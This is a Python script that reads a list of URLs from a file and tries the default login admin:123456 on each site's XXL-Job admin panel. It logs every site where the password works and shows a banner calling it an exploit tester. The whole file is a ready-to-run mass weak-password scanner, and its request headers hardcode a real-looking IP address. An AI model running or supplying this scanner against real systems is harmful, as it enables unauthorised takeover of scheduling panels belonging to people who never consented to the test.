import requests
import json
import argparse

def main(url):
    requests.packages.urllib3.disable_warnings()

    full_url = f"{url}/login"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
               "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
               "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
               "X-Requested-With": "XMLHttpRequest", "Origin": "http://47.99.241.235:8092", "Connection": "close",
               "Referer": "http://47.99.241.235:8092/toLogin"}
    data = {"userName": "admin", "password": "123456"}


    try:
        response = requests.post(full_url, headers=headers, data=data, allow_redirects=False, verify=False, timeout=5)
    except Exception :
        print(f"[-]{url}请求失败")
        return False
    if "code" in response.text :
        d = json.loads(response.text)
        if d.get("code") == 200 and d.get("msg") == None:
            print(f"[+]{url}存在弱口令,admin:123456")
            with open('a.txt', mode='a+', encoding='utf-8') as f1:
                f1.write(f"{url}")
        else:
            print(f"{url}不存在弱口令")
            return False
    else :
        print("不是xxl")

if __name__ == '__main__':
    banner = """
      __                   __  .__                        .__  .__
_/  |_  ____   _______/  |_|__| ____    ____   _____  |  | |  |
\   __\/ __ \ /  ___/\   __\  |/    \  / ___\  \__  \ |  | |  |
 |  | \  ___/ \___ \  |  | |  |   |  \/ /_/  >  / __ \|  |_|  |__
 |__|  \___  >____  > |__| |__|___|  /\___  /  (____  /____/____/
           \/     \/               \//_____/        \/
                                                    version: 0.0.1
                                                    author:   phh

    """
    print(banner)

    parser = argparse.ArgumentParser(description='testing all exp')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.mhx.com")
    args = parser.parse_args()

    with open('b.txt', mode='r', encoding='utf-8') as f:
        for line in f:
            args.url=line
            if main(args.url) == False:
                continue
